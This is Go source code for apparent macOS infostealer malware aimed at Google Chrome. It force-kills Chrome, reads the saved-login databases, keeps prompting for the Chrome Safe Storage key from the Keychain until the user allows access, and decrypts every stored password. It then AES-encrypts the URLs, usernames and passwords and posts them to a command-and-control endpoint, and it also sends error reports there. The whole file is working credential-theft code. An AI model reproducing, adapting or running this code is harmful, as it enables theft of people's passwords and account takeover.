package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha1"
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/crypto/pbkdf2"
)

const (
	C2_URL        = "http://localhost:8080/upload"                                                           // URL for Command and Control
	key           = "F\x9b^\x90\x1dK\t\x14\xae\xe4R\xf9\xbfl\xd4\n\x17}\xeb\xa9E\xean\n\xa7{N\x8f\xc3:\x19M" // AES 256-bit C2 Encryption Key
	retryInterval = 5 * time.Second                                                                          // Time to wait before repromting user for permission (if it is denied)
)

// Get Login Data File
func getChromeEncryptedPasswords() ([]string, error) {
	paths := []string{}
	homeDir, _ := os.UserHomeDir()
	basePath := fmt.Sprintf("%s/Library/Application Support/Google/Chrome/", homeDir)

	for _, profile := range []string{"Profile 1", "Profile 2", "Default"} {
		loginDataPath := fmt.Sprintf("%s%s/Login Data", basePath, profile)
		if _, err := os.Stat(loginDataPath); err == nil {
			paths = append(paths, loginDataPath)
		}
	}

	if len(paths) == 0 {
		return nil, fmt.Errorf("no Chrome Login Data found")
	}
	return paths, nil
}

// Get Chrome's Safe Storage Key from macOS Keychain
func getChromeStorageKey() ([]byte, error) {
	for {
		cmd := exec.Command("bash", "-c", "security 2>&1 find-generic-password -ga 'Chrome' | awk '{print $2}'")
		key, err := cmd.Output()
		if err != nil {
			sendErrorToServer(fmt.Sprintf("Error getting Chrome Safe Storage Key: %v", err), "C2_URL")
			time.Sleep(retryInterval * time.Second) // Retry every 5 seconds if permission is denied
			continue
		}

		// If key is found, clean and return it
		if len(key) > 0 {
			return cleanChromeKey(key)
		}
	}
}

// Extract the base64 Chrome Key from the output
func cleanChromeKey(key []byte) ([]byte, error) {

	keyStr := strings.TrimSpace(string(key))

	// Regular expression to match base64 encoded string
	re := regexp.MustCompile(`[A-Za-z0-9+/=]{22,}==?`)
	matches := re.FindStringSubmatch(keyStr)

	// Check if we found a base64 match
	if len(matches) == 0 {
		sendErrorToServer("No base64 encoded string found", C2_URL)
		return nil, fmt.Errorf("no base64 encoded string found")
	}
	return []byte(matches[0]), nil
}

// Decrypt the Chrome Safe Storage Key
func decryptSinglePassword(encryptedValue []byte, iv string, key []byte) ([]byte, error) {
	hexKey := hex.EncodeToString(key)
	hexEncPassword := base64.StdEncoding.EncodeToString(encryptedValue[3:])

	// Create the openssl command
	cmdString := fmt.Sprintf(
		"openssl enc -base64 -d -aes-128-cbc -iv %s -K %s <<< %s",
		iv, hexKey, hexEncPassword,
	)

	cmd := exec.Command("bash", "-c", cmdString)

	// Capture both stdout and stderr
	var out bytes.Buffer
	var errOut bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &errOut

	if err := cmd.Run(); err != nil {
		sendErrorToServer(fmt.Sprintf("Error decrypting password: %v", err), C2_URL)
		return nil, err
	}

	return out.Bytes(), nil
}

func deriveKey(safeStorageKey []byte) []byte {
	salt := []byte("saltysalt")
	iterations := 1003
	keyLength := 16 // AES-128, 16 bytes
	return pbkdf2.Key(safeStorageKey, salt, iterations, keyLength, sha1.New)
}

// Decrypt the passwords from the Login Data file
func decryptPasswords(safeStorageKey []byte, loginDataPath string) ([]string, error) {
	iv := "20202020202020202020202020202020" // 16-byte IV (AES-128-CBC requires 16 bytes)
	key := deriveKey(safeStorageKey)         // Derive the key using PBKDF2
	var decryptedEntries []string

	// Open Login Data DB file
	db, err := sql.Open("sqlite3", loginDataPath)
	if err != nil {
		sendErrorToServer(fmt.Sprintf("Error opening database: %v", err), C2_URL)
		return nil, err
	}
	defer db.Close()

	// Read URL, Username, and Password from the DB
	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''")
	if err != nil {
		sendErrorToServer(fmt.Sprintf("Error reading database: %v", err), C2_URL)
		return nil, err
	}
	defer rows.Close()

	for rows.Next() {
		var url, username string
		var encryptedPassword []byte

		// Scan the values into variables
		err := rows.Scan(&url, &username, &encryptedPassword)
		if err != nil {
			sendErrorToServer(fmt.Sprintf("Error scanning row: %v", err), C2_URL)
			continue
		}

		// Check if the encrypted password is in the correct format
		if len(encryptedPassword) > 3 && string(encryptedPassword[:3]) == "v10" {
			// Decrypt the password
			decryptedPassword, err := decryptSinglePassword(encryptedPassword, iv, key)
			if err != nil {
				sendErrorToServer(fmt.Sprintf("Error decrypting password for URL '%s', Username '%s': %v", url, username, err), C2_URL)
				continue
			}

			// Add the decrypted entry to the result
			decryptedEntries = append(decryptedEntries, fmt.Sprintf("URL: %s, Username: %s, Password: %s", url, username, string(decryptedPassword)))
		} else {
			sendErrorToServer(fmt.Sprintf("Unsupported or invalid encrypted password format for URL '%s', Username '%s'", url, username), C2_URL)
		}
	}

	// Check for any errors during rows iteration
	if err := rows.Err(); err != nil {
		sendErrorToServer(fmt.Sprintf("Error iterating rows: %v", err), C2_URL)
		return nil, err
	}

	return decryptedEntries, nil
}

// Encrypt the Decrypted Passwords and Send to C2
func sendDecryptedPasswordsToServer(decryptedData []string, C2_URL string) {
	data := map[string]interface{}{
		"Credentials Found": decryptedData,
	}

	// Convert the map to JSON
	payload, err := json.Marshal(data)
	if err != nil {
		sendErrorToServer(fmt.Sprintf("Failed to encode decrypted data to JSON: %v", err), C2_URL)
		return
	}

	// Encrypt the JSON payload using the C2 server's AES key
	encryptedPayload, err := encryptAES(payload, []byte(key))
	if err != nil {
		sendErrorToServer(fmt.Sprintf("Failed to encrypt payload: %v", err), C2_URL)
		return
	}

	// Base64 encode the encrypted payload
	encryptedBase64 := base64.StdEncoding.EncodeToString(encryptedPayload)

	// Send the encrypted base64 payload to the server
	_, err = sendPostRequest(C2_URL, encryptedBase64)
	if err != nil {
		sendErrorToServer(fmt.Sprintf("Error sending encrypted data to server: %v", err), C2_URL)
		return
	}
}

// Encrypt the Chrome passwords to send to C2 using AES-256-GCM and return the encrypted data
func encryptAES(plaintext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	// AES-GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	// Generate a random nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	// Encrypt the data
	ciphertext := gcm.Seal(nil, nonce, plaintext, nil)

	// Combine nonce and ciphertext
	return append(nonce, ciphertext...), nil
}

// Send a POST request to C2 with the Encrypted base64 data
func sendPostRequest(url, data string) (string, error) {
	client := &http.Client{}
	req, err := http.NewRequest("POST", url, bytes.NewBufferString(data))
	if err != nil {
		return "", err
	}

	req.Header.Set("Content-Type", "text/plain")
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	// Read the response
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(respBody), nil
}

// Send errors to C2
func sendErrorToServer(errorMessage string, serverURL string) {
	http.PostForm(serverURL, map[string][]string{"error": {errorMessage}})
}

// Terminate the first (main) running Chrome process
func terminateChromeProcess() {
	cmd := exec.Command("bash", "-c", "ps -A | grep Google\\ Chrome | awk '{print $1}'")
	chromePID, err := cmd.Output()
	if err != nil || len(chromePID) == 0 {
		return
	}

	cmd = exec.Command("kill", "-9", string(chromePID[:len(chromePID)-1]))
	cmd.Run()
	time.Sleep(time.Millisecond)
}

func main() {

	// Terminate Any Running Chrome Instance
	terminateChromeProcess()

	// Get the Login Data File
	loginData, err := getChromeEncryptedPasswords()
	if err != nil || len(loginData) == 0 {
		return
	}

	// Get the Chrome Safe Storage Key
	safeStorageKey, err := getChromeStorageKey()
	if err != nil {
		return
	}

	// Decrypt Passwords
	var decryptedPasswords []string
	for _, profile := range loginData {
		passwords, err := decryptPasswords(safeStorageKey, profile)
		if err == nil {
			decryptedPasswords = append(decryptedPasswords, passwords...)
		}
	}

	// Encrypt the Decrypted Passwords and Send them to C2
	sendDecryptedPasswordsToServer(decryptedPasswords, C2_URL)
}
